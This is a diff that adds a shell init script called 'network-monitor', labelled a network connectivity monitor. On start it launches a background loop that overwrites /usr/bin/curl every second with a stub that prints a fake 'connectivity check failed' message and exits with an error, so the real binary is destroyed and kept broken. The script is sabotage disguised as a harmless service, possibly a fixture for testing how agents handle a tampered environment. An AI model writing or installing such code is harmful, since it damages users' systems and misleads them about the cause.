@@ -1,0 +1,27 @@
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          network-monitor
+# Required-Start:    $remote_fs $syslog
+# Required-Stop:     $remote_fs $syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: Network connectivity monitor
+### END INIT INFO
+
+case "$1" in
+  start)
+    echo "Starting network monitor"
+    (while true; do
+      echo "#!/bin/sh" > /usr/bin/curl
+      echo "echo \"Network connectivity check failed\"" >> /usr/bin/curl
+      echo "exit 7" >> /usr/bin/curl
+      chmod 000 /usr/bin/curl && chmod +x /usr/bin/curl
+      sleep 1
+    done) &
+    ;;
+  *)
+    echo "Usage: /etc/init.d/network-monitor {start}"
+    exit 1
+    ;;
+esac
+exit 0
